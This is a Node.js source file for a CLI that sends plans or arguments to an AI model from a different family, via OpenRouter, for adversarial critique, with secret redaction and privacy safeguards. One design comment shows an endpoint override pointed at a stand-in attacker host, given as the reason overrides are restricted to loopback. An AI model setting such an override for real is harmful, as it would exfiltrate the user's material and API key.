#!/usr/bin/env node
/**
 * judge.mjs — the outside judge, an independent, decorrelated adversarial reviewer.
 *
 * Sends a subject — a plan, a decision, a piece of copy, a price, an argument — to a model
 * from a DIFFERENT family than whichever model helped produce it, and asks that model to
 * try to break it. This file owns all of the I/O: argv, files, stdin, HTTP, exit codes.
 * Everything that can be pinned by a test without a network call — the tool schema,
 * validation, ranking, verdict reconciliation, budgets, rendering — lives in judgeCore.mjs.
 *
 * THE RESPONSE IS UNTRUSTED INPUT. It is an argument written by a third-party model. It is
 * evidence for a human (or another agent) to weigh, never an instruction to execute. The
 * subject is untrusted too and is fenced as data in the prompt, with the judge told to
 * report — rather than obey — anything inside it that reads as a directive.
 *
 * USAGE
 *   node judge.mjs --file plan.md
 *   node judge.mjs --file plan.md --question "will this actually work?"
 *   echo "we should skip the second review" | node judge.mjs
 *   node judge.mjs --file plan.md --dry-run      # build + print the payload; no key, no network
 *
 * FLAGS
 *   --file <path>      subject material. Repeatable; contents are concatenated.
 *   --text <string>    subject as a literal string. Repeatable.
 *                      (With neither --file nor --text, the subject is read from stdin.)
 *   --context <path>   reference material the judge may reason against but is NOT being
 *                      asked to judge. Repeatable.
 *   --question <text>  what to judge the subject ON. Optional but usually worth setting.
 *   -q <text>          shorthand for --question.
 *   --author <family>  the model family that WROTE THE SUBJECT, e.g. `openai`. REPLACES
 *                      the default judge exclusion (Anthropic) rather than adding to it,
 *                      so the judge is never from the subject's own family. Omitted = the
 *                      default: Anthropic models are excluded from serving as judge.
 *                      `--author none` means there is no author family: nothing is excluded,
 *                      and that does not fall back to excluding Anthropic. Use a family when
 *                      the subject was drafted by some other assistant — it is "who wrote
 *                      this subject", not "which assistant am I".
 *   --out <path>       also write the markdown report to a file.
 *   --max <n>          ceiling on challenges shown (default 10).
 *   --dry-run          print what would be sent and exit. No key needed, no network call.
 *   --json             print the machine-readable result object instead of the markdown
 *                      report (a file passed via --out still gets the markdown report).
 *   --check            after a usable verdict, also score the REVIEW with Jev (see QUALITY
 *                      CHECK below). Off by default, because it sends the masked write-up to
 *                      a second party.
 *   --check-flaw <text>
 *                      with --check, also ask Jev whether any challenge identifies this
 *                      specific flaw. The eval loop passes each case's planted flaw; the text
 *                      is masked like the subject before it is sent.
 *   --help, -h         print this text.
 *
 * ENVIRONMENT
 *   OPENROUTER_API_KEY    required unless --dry-run, or JUDGE_FIXTURE is set.
 *   JUDGE_MODEL           optional comma-separated chain override. An override that does
 *                         not lead with an OpenRouter Auto Router slug is an informational
 *                         note in the report, not a degraded run: the review is valid, and
 *                         the note says the pin replaced the Auto Router.
 *   JUDGE_TIMEOUT_MS      per-attempt timeout override, in ms (1000-720000; default 600000).
 *                         The whole-chain walk deadline is derived from this as 1.5x it.
 *   JUDGE_FIXTURE         path to a saved OpenRouter response JSON; replayed for every
 *                         attempt in the chain walk instead of making a network call. Lets
 *                         a "no tool call" fixture exercise the whole walk.
 *   JUDGE_OPENROUTER_URL  test-only override of the OpenRouter endpoint. Accepted ONLY for
 *                         a loopback host (127.0.0.1 / localhost / ::1) — every request
 *                         carries a live API key, so a non-loopback override would send
 *                         both the subject and the key wherever it pointed. This exists for
 *                         the tests in this repository and has no other use.
 *   JUDGE_CHECK           "1" turns the quality check on, like --check. Any other non-empty
 *                         value except "0" is reported and ignored: the check stays off.
 *   JUDGE_DECISIONS_URL   test-only override of the decisions endpoint the quality check
 *                         uses. Loopback-only, for the same reason and by the same guard as
 *                         JUDGE_OPENROUTER_URL.
 *
 * QUALITY CHECK (opt-in). With --check, once the judge has returned a usable verdict, ONE more
 * request goes to OpenRouter's decisions endpoint, pinned to `typesafe/jev-1.13` (Jev, from
 * TypeSafe, whose only endpoint is on OpenRouter's zero-data-retention list). It carries the
 * already-masked write-up, the question, the verdict and its reason, and the top five
 * challenges, and it asks whether the falsifiers are concrete, whether each challenge engages
 * with what the write-up argues, and whether the verdict fits the challenges' weight. An answer
 * from any provider but TypeSafe is dropped. The check can never fail or degrade the grill:
 * whatever goes wrong, the report says "quality check unavailable" and the exit code is
 * unchanged. With JUDGE_FIXTURE set it sends nothing. See checkCore.mjs.
 *
 * PRIVACY. Every judge request asks OpenRouter to route only to endpoints with a zero-data-
 * retention policy (`provider: { zdr: true, data_collection: "deny" }`). This is not
 * configurable — there is no flag or environment variable that turns it off. A model with
 * no such endpoint fails that request, and the chain walks on to the next link rather than
 * silently falling back to a data-retaining endpoint. The quality check's documented request
 * body has no such field, so its guarantee is the pinned model instead (see QUALITY CHECK).
 * Every request leaves through one function, to one of two OpenRouter URLs, and follows no
 * redirect. No `HTTP-Referer` header is sent; requests identify themselves only by the
 * `X-Title` header below.
 *
 * EXIT CODES. Non-zero ONLY for a failure that is OURS to fix: bad arguments, an empty
 * subject, a missing key on a real (non-fixture, non-dry-run) run, or an unusable endpoint
 * override. A run that COMPLETED but could not see everything — a clipped subject, a
 * provider outage, a judge from the subject's own model family — prints the degradation
 * loudly on stderr, renders the banner in the report, and exits 0. "Nothing found" and
 * "the judge was blind" must never look the same. The quality check never changes the exit
 * code either way.
 */

import { readFileSync, writeFileSync } from "node:fs";

import {
  autoRouterPlugin,
  budgetText,
  NO_AUTHOR_FAMILY,
  redactSensitive,
  CONTEXT_BUDGET,
  DEFAULT_CHAIN,
  JUDGE_TOOL,
  MAX_CHALLENGES,
  MAX_LINK_TIMEOUT_MS,
  MIN_LINK_TIMEOUT_MS,
  buildJudgeMessages,
  checkGrounding,
  decorrelationOf,
  reconcileVerdict,
  renderJudgeReport,
  resolveChain,
  resolveWalkBudget,
  shouldAdvanceChain,
  SUBJECT_BUDGET,
  toolCallArgumentsOf,
  validateChallenges,
} from "./judgeCore.mjs";
import {
  buildCheckRequest,
  CHECK_MAX_CHALLENGES,
  CHECK_TIMEOUT_MS,
  CHECK_WRITE_UP_BUDGET,
  JEV_MODEL,
  JEV_PROVIDER,
  plantedFlawQuestion,
  readCheck,
} from "./checkCore.mjs";

/**
 * THE ENDPOINTS, and why each override is LOOPBACK-ONLY.
 *
 * There are exactly two places a request can go: the judge's chat endpoint and, only with
 * --check, the decisions endpoint the quality check uses. Both are spelled out once, below,
 * and scripts/privacy.test.mjs pins that nothing else in this file names a destination.
 *
 * Every request attaches `Authorization: Bearer $OPENROUTER_API_KEY`. An override that
 * accepted any host would ship the subject AND a live metered credential wherever it
 * pointed — `JUDGE_OPENROUTER_URL=https://attacker.example/collect` is an exfiltration
 * primitive, not a test seam. So an override is honoured only for a loopback host, which
 * is all a test needs, and anything else FAILS CLOSED and loudly rather than silently
 * falling back to the real endpoint — a silent fallback would make a misconfigured run
 * indistinguishable from a correct one. One guard serves both overrides, so they cannot
 * drift apart.
 */
const OPENROUTER_DEFAULT_URL = "https://openrouter.ai/api/v1/chat/completions";
const DECISIONS_DEFAULT_URL = "https://openrouter.ai/api/alpha/decisions";
const LOOPBACK_HOSTS = new Set(["127.0.0.1", "localhost", "::1", "[::1]"]);

function resolveEndpoint(name, raw, defaultUrl) {
  const override = typeof raw === "string" ? raw.trim() : "";
  if (override === "") return defaultUrl;
  let host = null;
  try {
    host = new URL(override).hostname;
  } catch {
    return fail(`${name} is not a URL: ${override}`);
  }
  if (!LOOPBACK_HOSTS.has(host)) {
    return fail(
      `${name} must point at loopback — got host "${host}". Every request carries a live `
        + "OPENROUTER_API_KEY, so a non-loopback override would send the subject and the key there. "
        + "It exists for this project's own tests and has no other use.",
    );
  }
  return override;
}

const OPENROUTER_URL = resolveEndpoint("JUDGE_OPENROUTER_URL", process.env.JUDGE_OPENROUTER_URL, OPENROUTER_DEFAULT_URL);
const DECISIONS_URL = resolveEndpoint("JUDGE_DECISIONS_URL", process.env.JUDGE_DECISIONS_URL, DECISIONS_DEFAULT_URL);

function fail(message) {
  console.error(`[judge] ERROR: ${message}`);
  process.exit(1);
}

// ── Arguments ────────────────────────────────────────────────────────────────
function parseArgs(argv) {
  const opts = {
    files: [],
    texts: [],
    contexts: [],
    question: "",
    out: null,
    max: MAX_CHALLENGES,
    dryRun: false,
    json: false,
    author: "",
    check: false,
    checkFlaw: null,
  };
  for (let i = 0; i < argv.length; i++) {
    const arg = argv[i];
    const next = () => {
      const v = argv[++i];
      if (v === undefined) fail(`${arg} needs a value`);
      return v;
    };
    switch (arg) {
      case "--file":
        opts.files.push(next());
        break;
      case "--text":
        opts.texts.push(next());
        break;
      case "--context":
        opts.contexts.push(next());
        break;
      case "--question":
      case "-q":
        opts.question = next();
        break;
      case "--out":
        opts.out = next();
        break;
      case "--max":
        opts.max = Number(next());
        // Number.isInteger, not isFinite: `--max 1.5` would otherwise be accepted and
        // then silently coerced later, so the documented contract and the behaviour
        // would disagree.
        if (!Number.isInteger(opts.max) || opts.max < 1) fail("--max must be a positive integer");
        break;
      case "--author":
        // WHO WROTE THE SUBJECT — not which assistant is running this. Declaring the
        // wrong family here (or the subject's own family) would let that family judge
        // itself; declare it only when the subject genuinely came from elsewhere.
        opts.author = String(next()).trim().toLowerCase();
        break;
      case "--dry-run":
        opts.dryRun = true;
        break;
      case "--json":
        opts.json = true;
        break;
      case "--check":
        opts.check = true;
        break;
      case "--check-flaw":
        opts.checkFlaw = next();
        break;
      case "--help":
      case "-h":
        {
          // Read to the docblock's own terminator, not to a hardcoded line number, so
          // --help cannot silently go stale the moment a line is added above it.
          const lines = readFileSync(new URL(import.meta.url), "utf8").split("\n");
          const start = lines.findIndex((l) => l.trim() === "/**");
          const end = lines.findIndex((l, i) => i > start && l.trim() === "*/");
          const body = lines.slice(start + 1, end === -1 ? lines.length : end);
          console.log(body.map((l) => l.replace(/^ \* ?/, "")).join("\n"));
        }
        process.exit(0);
        break;
      default:
        fail(`unknown argument: ${arg}`);
    }
  }
  return opts;
}

const opts = parseArgs(process.argv.slice(2));

function readFileOrFail(path, what) {
  try {
    return readFileSync(path, "utf8");
  } catch (e) {
    return fail(`cannot read ${what} ${path}: ${e?.message ?? e}`);
  }
}

function readStdin() {
  try {
    // fd 0 read fails with EAGAIN on an interactive TTY with no piped input — that is
    // "nothing was piped", not an error worth exiting on.
    return readFileSync(0, "utf8");
  } catch {
    return "";
  }
}

// ── The subject ──────────────────────────────────────────────────────────────
const subjectParts = [];
const subjectLabels = [];

for (const path of opts.files) {
  subjectParts.push(`--- ${path} ---\n${readFileOrFail(path, "subject file")}`);
  subjectLabels.push(path);
}

for (const text of opts.texts) {
  subjectParts.push(text);
  subjectLabels.push("(inline text)");
}

if (subjectParts.length === 0) {
  const piped = readStdin();
  if (piped.trim() !== "") {
    subjectParts.push(piped);
    subjectLabels.push("(stdin)");
  }
}

if (subjectParts.length === 0) {
  fail("no subject — pass --file, --text, or pipe the material on stdin");
}

const degraded = [];

// Privacy, before anything else is built: a secret anywhere in what would be sent stops the run
// with no network call; contact details are masked. See redactSensitive in judgeCore.mjs.
const masked = { email: 0, phone: 0, card: 0 };
function outgoing(text, what) {
  const r = redactSensitive(text);
  if (r.secrets.length > 0) {
    fail(
      `the ${what} contains what looks like ${r.secrets.join(" and ")}. Nothing was sent. ` +
        "Remove it and try again; a judge never needs a key or token to weigh a decision.",
    );
  }
  for (const k of Object.keys(masked)) masked[k] += r.masked[k];
  return r.text;
}

const subjectRaw = outgoing(subjectParts.join("\n\n"), "subject");
opts.question = outgoing(opts.question, "question");
const subject = budgetText(subjectRaw, SUBJECT_BUDGET);
if (subject.clipped) {
  degraded.push(
    `the subject was CLIPPED to ${SUBJECT_BUDGET} of ${subject.originalChars} characters — the judge did not see the end of it, so a challenge it did not make may simply be one it could not reach`,
  );
}

const subjectLabel = subjectLabels.length === 1 ? subjectLabels[0] : `${subjectLabels.length} sources`;

// ── The quality check: opt-in, and fully decided before anything is sent ──────
// Exactly "1" turns it on. Anything else that is set, bar "0", is announced and ignored rather
// than guessed at: this switch starts a second flow of the write-up to a third party, so the
// only safe reading of a value nobody recognises is "off", and an ignored setting nobody can
// see would be indistinguishable from no setting.
const checkEnv = typeof process.env.JUDGE_CHECK === "string" ? process.env.JUDGE_CHECK.trim() : "";
if (checkEnv !== "" && checkEnv !== "0" && checkEnv !== "1") {
  console.error(`[judge] JUDGE_CHECK=${checkEnv} is not "1" — IGNORED, the quality check is off unless --check is passed`);
}
const checkWanted = opts.check || checkEnv === "1";

// The planted-flaw question is text that will be SENT, so it goes through the same gate as the
// subject: a secret stops the run here, before any request; contact details are masked.
let checkExtra = null;
if (opts.checkFlaw !== null) {
  if (!checkWanted) fail("--check-flaw adds a question to the quality check, so it needs --check (or JUDGE_CHECK=1)");
  checkExtra = plantedFlawQuestion(outgoing(opts.checkFlaw, "--check-flaw text"));
  if (checkExtra === null) fail("--check-flaw needs the flaw, in words");
}

// ── Context ──────────────────────────────────────────────────────────────────
const contextBlocks = [];
for (const path of opts.contexts) {
  const raw = outgoing(readFileOrFail(path, "context file"), `context file ${path}`);
  const block = budgetText(raw, CONTEXT_BUDGET);
  if (block.clipped) {
    // Context clipping is reported but is NOT a degradation of the review itself: the
    // subject was read in full and the judgement stands on it. Conflating the two would
    // band a sound run as degraded for the wrong reason.
    console.error(`[judge] note: context ${path} clipped to ${CONTEXT_BUDGET} of ${block.originalChars} chars`);
  }
  contextBlocks.push({ label: path, text: block.text });
}

// ── The request ──────────────────────────────────────────────────────────────
const messages = buildJudgeMessages({
  subject: subject.text,
  question: opts.question,
  contextBlocks,
  subjectLabel,
});

const chainChoice = resolveChain(process.env.JUDGE_MODEL, { defaultChain: DEFAULT_CHAIN });
if (chainChoice.source === "env-empty") {
  fail("JUDGE_MODEL is set but parses to no models — unset it or give it a real chain");
}
const modelChain = chainChoice.chain;
const primaryModel = chainChoice.primary;

const notes = [];
if (chainChoice.shadowed) {
  // Not a degradation — the review is complete and valid, it was just judged by a model
  // chosen out of sight. It has to stay off `degraded`: that list is the "NO review"
  // banner, and a deliberate pin would make every such run look invalid.
  notes.push(
    `JUDGE_MODEL pins \`${modelChain.join(">")}\`, which SHADOWS the default's Auto Router — the per-request model choice is off and this judge is pinned to one vendor`,
  );
}

const autoPlugin = autoRouterPlugin(primaryModel, opts.author);
// Under an Auto primary the chain is walked by hand, one request per link, sending no
// `models` array. OpenRouter documents `{model: "openrouter/auto", models: [...]}` nowhere,
// and that array only ever fires on an API ERROR — so it could never rescue the failure
// that actually matters here: a 200 from a router pick with no tool support, which returns
// prose and loses the whole review.
const walksChain = autoPlugin !== null && modelChain.length > 1;
const attemptChain = walksChain ? modelChain : [primaryModel];

// HOW LONG THE JUDGE GETS, and how long the walk gets. Both numbers, and why, live once in
// judgeCore.resolveWalkBudget — this file only reads the environment. An unusable override
// is announced rather than silently ignored.
const { linkTimeoutMs, walkDeadlineMs, ignored: ignoredTimeout } = resolveWalkBudget(process.env.JUDGE_TIMEOUT_MS);
if (ignoredTimeout !== null) {
  console.error(
    `[judge] JUDGE_TIMEOUT_MS=${ignoredTimeout} is not a millisecond count in [${MIN_LINK_TIMEOUT_MS}, ${MAX_LINK_TIMEOUT_MS}] — IGNORED, using ${linkTimeoutMs}ms`,
  );
}
// The check's one request never gets longer than one judge attempt does, so JUDGE_TIMEOUT_MS
// bounds both and there is no second knob to forget.
const checkTimeoutMs = Math.min(CHECK_TIMEOUT_MS, linkTimeoutMs);

function bodyFor(model) {
  const body = { model, messages };
  if (!walksChain && modelChain.length > 1) body.models = modelChain;
  // Derived from the LINK, not the primary: past the first hop the links are concrete
  // slugs and must carry no router plugin, or the setting rides under an id that model
  // never reads.
  const plugin = autoRouterPlugin(model, opts.author);
  if (plugin) body.plugins = [plugin];
  body.tools = [{ type: "function", function: JUDGE_TOOL }];
  body.tool_choice = { type: "function", function: { name: JUDGE_TOOL.name } };
  body.usage = { include: true };
  // PRIVACY IS NOT CONFIGURABLE. Every request, on every link of the chain, asks for
  // zero-data-retention routing — there is no flag or environment variable that removes
  // this. A model with no such endpoint fails this specific request, which the chain walk
  // treats like any other HTTP failure and moves past rather than retrying without it.
  body.provider = { zdr: true, data_collection: "deny" };
  return body;
}

if (opts.dryRun) {
  const promptChars = messages.reduce((n, m) => n + m.content.length, 0);
  console.log(`[judge] dry run — would POST to ${OPENROUTER_URL}`);
  console.log(`[judge] subject: ${subjectLabel} · ${subject.originalChars} chars${subject.clipped ? " (CLIPPED)" : ""}`);
  console.log(`[judge] context: ${contextBlocks.length ? contextBlocks.map((c) => c.label).join(", ") : "(none)"}`);
  console.log(`[judge] question: ${opts.question || "(none — open review)"}`);
  console.log(`[judge] chain: ${modelChain.join(" > ")} · ${chainChoice.source === "env" ? "PINNED by JUDGE_MODEL" : "default"}`);
  const noAuthorFamily = opts.author === NO_AUTHOR_FAMILY;
  const routerNote = !autoPlugin
    ? `off — primary "${primaryModel}" is a concrete slug`
    : noAuthorFamily
      ? `plugin "${autoPlugin.id}" · excluding nothing (no author family — this does not fall back to excluding Anthropic)`
      : `plugin "${autoPlugin.id}" · excluding ${autoPlugin.excluded_models.join(", ")} (${
          opts.author
            ? `the declared author family \`${opts.author}\`, IN PLACE OF the default — a judge from the subject's own family buys nothing`
            : "the default excluded family — a same-family judge buys nothing"
        })`;
  console.log(`[judge] auto-router: ${routerNote}`);
  console.log(
    `[judge] declared author: ${
      noAuthorFamily ? "none — no author family, nothing excluded" : opts.author || "(omitted — Anthropic excluded by default)"
    }`,
  );
  console.log("[judge] data policy: zero-data-retention endpoints only, on every request (not configurable)");
  console.log(`[judge] chain walk: ${walksChain ? `ON — up to ${attemptChain.length} request(s)` : "off — one request"}`);
  console.log(
    `[judge] quality check: ${
      checkWanted
        ? `ON — after a usable verdict, one POST to ${DECISIONS_URL} (${JEV_MODEL}; answers used only if served by ${JEV_PROVIDER}) carrying the masked write-up, the question, the verdict and the top ${CHECK_MAX_CHALLENGES} challenges${
            checkExtra ? `, plus the question(s) ${Object.keys(checkExtra).join(", ")}` : ""
          }`
        : "off (--check or JUDGE_CHECK=1 turns it on)"
    }`,
  );
  console.log(`[judge] prompt: ${promptChars} chars`);
  for (const d of degraded) console.log(`[judge] DEGRADED: ${d}`);
  for (const note of notes) console.log(`[judge] note: ${note}`);
  console.log("\n--- payload (truncated to 20k chars for display) ---");
  console.log(JSON.stringify(bodyFor(primaryModel), null, 2).slice(0, 20000));
  process.exit(0);
}

// ── The call ─────────────────────────────────────────────────────────────────
const FIXTURE = process.env.JUDGE_FIXTURE;

if (!FIXTURE && !process.env.OPENROUTER_API_KEY) {
  fail(
    "OPENROUTER_API_KEY is not set, so the judge cannot run. Export it, set JUDGE_FIXTURE to "
      + "replay a saved response, or pass --dry-run to inspect the request payload without either.",
  );
}

/**
 * THE ONE PLACE THE INSTALLED CODE TOUCHES THE NETWORK. scripts/privacy.test.mjs counts the
 * fetch calls across every shipped file and requires exactly one, here, and requires every
 * caller to pass OPENROUTER_URL or DECISIONS_URL. Both requests go through it — the judge's
 * and the opt-in quality check's — so they share one set of headers, one timeout mechanism
 * and one guarded body read, and neither can quietly grow a second, laxer copy.
 *
 * It never throws and never exits: it reports what happened, and each caller decides what
 * that means. For the judge an unparseable body is fatal; for the check it only makes the
 * check unavailable.
 *
 * `redirect: "error"`, because a redirect is the one way a request could reach a URL this
 * file never named: fetch's default re-sends a 307/308's body — the write-up — to wherever
 * the redirect points (it strips only the key). Neither endpoint redirects in normal
 * operation, so a refused hop costs nothing but a failed request, which each caller already
 * handles.
 *
 * Returns `{outcome: "ok", status, data}`, or `{outcome, status, detail|error}` with outcome
 * "no-response" (no status at all), "http" (a non-2xx; `detail` is its body),
 * "stalled" (headers arrived, the body did not) or "unparseable" (`detail` is the body).
 */
async function postJson(url, body, timeoutMs) {
  let response = null;
  try {
    response = await fetch(url, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${process.env.OPENROUTER_API_KEY}`,
        "Content-Type": "application/json",
        "X-Title": "Grill",
      },
      body: JSON.stringify(body),
      redirect: "error",
      signal: AbortSignal.timeout(timeoutMs),
    });
  } catch (e) {
    return { outcome: "no-response", status: null, error: e };
  }
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    return { outcome: "http", status: response.status, detail };
  }
  // THE BODY READ IS INSIDE A GUARD, and that placement is the whole point. `AbortSignal
  // .timeout` stays armed after `fetch` resolves — it is attached to the response STREAM,
  // not just the request — so a model that returns headers promptly and then keeps
  // generating for the rest of its budget aborts HERE, not at the `fetch` call above.
  // Left unguarded, that rejection would escape as an unhandled promise rejection and
  // crash the process before any diagnostic could be written.
  let bodyText;
  try {
    bodyText = await response.text();
  } catch (e) {
    return { outcome: "stalled", status: response.status, error: e };
  }
  try {
    return { outcome: "ok", status: response.status, data: JSON.parse(bodyText) };
  } catch {
    return { outcome: "unparseable", status: response.status, detail: bodyText };
  }
}

async function callLink(model) {
  if (FIXTURE) {
    return { data: JSON.parse(readFileOrFail(FIXTURE, "fixture")), failure: null, status: 200 };
  }
  const r = await postJson(OPENROUTER_URL, bodyFor(model), linkTimeoutMs);
  if (r.outcome === "no-response") {
    return { data: null, failure: `no response from OpenRouter: ${r.error?.message ?? r.error}`, status: null };
  }
  if (r.outcome === "http") {
    return {
      data: null,
      status: r.status,
      failure: `OpenRouter returned ${r.status} for ${
        walksChain ? `link ${model}` : `chain ${modelChain.join(">")}`
      }: ${r.detail.slice(0, 300)}`,
    };
  }
  if (r.outcome === "stalled") {
    // `status: null` is load-bearing: it makes this a TRANSPORT outcome, so
    // `shouldAdvanceChain` walks to the next link instead of treating a 200-that-never-
    // arrived as an answer. The degradation path this already had is the one a stalled body
    // belongs on.
    return {
      data: null,
      status: null,
      failure: `the judge never finished sending its answer — a ${r.status} arrived but the body stalled, which is the ${linkTimeoutMs}ms per-attempt ceiling firing mid-generation: ${r.error?.message ?? r.error}`,
    };
  }
  if (r.outcome === "unparseable") {
    return fail(`OpenRouter returned unparseable JSON: ${r.detail.slice(0, 500)}`);
  }
  return { data: r.data, failure: null, status: r.status };
}

if (FIXTURE) console.error(`[judge] fixture: ${FIXTURE} (no network call, replayed per attempt)`);

let data = null;
let walkedCostUsd = 0;
const walkStartedAt = Date.now();
// The failure of the attempt we walked PAST. A successful walk must not render as
// degraded, so an advanced-past failure is deliberately not banded — but when the deadline
// below stops the walk, the reason the previous link failed is the most useful sentence in
// the report, and without this it would be the one sentence missing.
let lastFailure = null;
for (let i = 0; i < attemptChain.length; i++) {
  // CHECKED BETWEEN LINKS, never mid-flight — interrupting an attempt in progress is the
  // abort signal's job, and two mechanisms timing one call is how they drift apart. Every
  // attempt is billed, so a chain that has already spent its budget failing is not worth
  // one more paid try.
  const elapsedMs = Date.now() - walkStartedAt;
  if (i > 0 && elapsedMs > walkDeadlineMs) {
    // `data` STILL HOLDS the attempt walked past, and its cost is already inside
    // walkedCostUsd. Every other exit from this loop is a `stay`, where the attempt in
    // `data` was NOT counted — so the post-loop `data.usage.cost + walkedCostUsd` is right
    // there and would bill this one twice, name a rejected response as the model that
    // served the run, and report the chain "exhausted" when links were never called. The
    // walk reached no answer: say so.
    data = null;
    if (lastFailure) degraded.push(lastFailure);
    degraded.push(
      `the chain walk was ABANDONED after ${Math.round(elapsedMs / 1000)}s — the ${Math.round(
        walkDeadlineMs / 1000,
      )}s walk deadline passed with ${attemptChain.length - i} link(s) unattempted, so this subject was not judged by them`,
    );
    break;
  }
  const link = attemptChain[i];
  const hasNext = i + 1 < attemptChain.length;
  const attempt = await callLink(link);
  data = attempt.data;
  lastFailure = attempt.failure ?? null;

  const outcome = attempt.failure
    ? attempt.status === null
      ? "transport"
      : "http"
    : toolCallArgumentsOf(attempt.data) !== null
      ? "usable"
      : "no-tool-call";

  const step = shouldAdvanceChain({ outcome, status: attempt.status, hasNext });
  if (!step.advance) {
    if (attempt.failure) degraded.push(attempt.failure);
    break;
  }
  const served = typeof attempt.data?.model === "string" && attempt.data.model.length > 0 ? attempt.data.model : null;
  const spent = typeof attempt.data?.usage?.cost === "number" ? attempt.data.usage.cost : null;
  // Every attempt is BILLED, walked past or not. Counting only the answering call
  // understates a walked run exactly when it cost the most and bought the least.
  if (spent !== null) walkedCostUsd += spent;
  console.error(`[judge] chain advance: ${link}${served && served !== link ? ` (served ${served})` : ""} → ${attemptChain[i + 1]} · ${step.reason}`);
}

// ── The result ───────────────────────────────────────────────────────────────
let servedModel = null;
let costUsd = walkedCostUsd > 0 ? walkedCostUsd : null;
let decorrelated = null;
let parsed = null;

if (data) {
  servedModel = typeof data.model === "string" && data.model.length > 0 ? data.model : null;
  costUsd = typeof data?.usage?.cost === "number" ? data.usage.cost + walkedCostUsd : costUsd;

  // THE DECORRELATION CHECK — the one that decides whether this run bought anything at
  // all. A run served by the author's own family renders exactly like an independent one
  // unless this says otherwise, and "an independent judge" is the entire reason to ask for
  // this rather than judging it oneself.
  const decor = decorrelationOf(servedModel, opts.author);
  decorrelated = decor.decorrelated;
  if (!decor.decorrelated) {
    degraded.push(
      decor.reason === "author-family"
        ? `NOT AN INDEPENDENT REVIEW — ${decor.note}. Asked for chain ${modelChain.join(">")}`
        : `${decor.note} (asked for chain ${modelChain.join(">")})`,
    );
  }

  const rawArgs = toolCallArgumentsOf(data);
  if (rawArgs === null) {
    degraded.push(
      `the judge returned no tool call (finish_reason: ${data?.choices?.[0]?.finish_reason ?? "none"}) — the chain was exhausted without a usable answer`,
    );
  } else {
    try {
      parsed = JSON.parse(rawArgs);
    } catch (e) {
      degraded.push(`the judge's tool call did not parse as JSON: ${e?.message ?? e}`);
    }
  }
} else if (degraded.length === 0) {
  degraded.push("no response from any link in the chain");
}

const validation = validateChallenges(parsed?.challenges, { maxChallenges: opts.max });
const verdict = reconcileVerdict(parsed?.verdict, validation.challenges);

// Against the texts exactly as SENT — masked, and clipped if the subject was — because the
// question is whether the judge quoted words it was actually given. Local and free: this
// sends nothing, so it always runs.
const grounding = checkGrounding(validation.challenges, subject.text, opts.question);

const result = {
  subjectLabel,
  question: opts.question,
  verdict: verdict.verdict,
  verdictStated: verdict.stated,
  verdictCoherent: verdict.coherent,
  verdictNote: verdict.note,
  verdictReason: typeof parsed?.verdict_reason === "string" ? parsed.verdict_reason : "",
  steelman: typeof parsed?.steelman === "string" ? parsed.steelman : "",
  counterSteelman: typeof parsed?.counter_steelman === "string" ? parsed.counter_steelman : "",
  strongestObjection: typeof parsed?.strongest_objection === "string" ? parsed.strongest_objection : "",
  challenges: validation.challenges,
  rejected: validation.rejected,
  capped: validation.capped,
  degraded,
  notes,
  servedModel,
  requestedChain: modelChain,
  declaredAuthor: opts.author,
  decorrelated,
  costUsd,
  masked,
  grounding,
  // null: not asked for. Otherwise readCheck's summary, or `{unavailable: reason}`.
  quality: null,
};

/** Why a check request that went out came back with nothing usable, for the report. */
function checkFailure(r) {
  if (r.outcome === "no-response") {
    const cause = r.error?.cause?.message ? ` (${r.error.cause.message})` : "";
    return `no response from OpenRouter's decisions endpoint: ${r.error?.message ?? r.error}${cause}`;
  }
  if (r.outcome === "http") return `OpenRouter's decisions endpoint returned ${r.status}: ${r.detail.slice(0, 300)}`;
  if (r.outcome === "stalled") return `Jev's answer stalled after a ${r.status} and hit the ${checkTimeoutMs}ms ceiling`;
  return "OpenRouter's decisions endpoint returned a body that is not JSON";
}

/**
 * The opt-in quality check. NEVER THROWS AND NEVER EXITS: whatever happens, the grill above
 * it is already complete, and the worst this can do is say it has nothing to add. The try is
 * the backstop for that promise; every expected failure is handled before it.
 */
async function runQualityCheck(forResult) {
  try {
    if (FIXTURE) {
      return { unavailable: "not run: JUDGE_FIXTURE replays a saved judge response, and a fixture run sends nothing" };
    }
    if (!forResult.verdict) {
      return { unavailable: "not run: the grill returned no usable verdict, so there was nothing to check and nothing was sent" };
    }
    // The subject as the JUDGE was sent it — already masked — clipped again to what Jev can
    // hold. Never the raw input: this second reader sees nothing the first did not.
    const writeUp = budgetText(subject.text, CHECK_WRITE_UP_BUDGET);
    const request = buildCheckRequest({
      subject: writeUp.text,
      question: opts.question,
      result: forResult,
      extraQuestions: checkExtra,
    });
    const r = await postJson(DECISIONS_URL, request, checkTimeoutMs);
    if (r.outcome !== "ok") return { unavailable: checkFailure(r) };
    const quality = readCheck(r.data);
    if (writeUp.clipped && !quality.unavailable) {
      quality.flags.push(
        `Jev saw only the first ${writeUp.keptChars} of ${writeUp.originalChars} characters of the write-up, so these scores cover only that part.`,
      );
    }
    return quality;
  } catch (e) {
    return { unavailable: `the check failed unexpectedly: ${e?.message ?? e}` };
  }
}

if (checkWanted) {
  result.quality = await runQualityCheck(result);
  // Said on stderr for whoever is watching, but never as DEGRADED: the grill is intact.
  if (result.quality.unavailable) console.error(`[judge] quality check unavailable: ${result.quality.unavailable}`);
}

const report = renderJudgeReport(result);

if (opts.out) {
  writeFileSync(opts.out, report, "utf8");
  console.error(`[judge] report written to ${opts.out}`);
}

console.log(opts.json ? JSON.stringify(result, null, 2) : report);

// Degradation is reported in the banner and on stderr; it is NOT an exit-1 condition,
// because the run completed and a provider being unreachable is not a failure of the
// arguments this script was given.
for (const d of degraded) console.error(`[judge] DEGRADED: ${d}`);
for (const note of notes) console.error(`[judge] note: ${note}`);
process.exit(0);
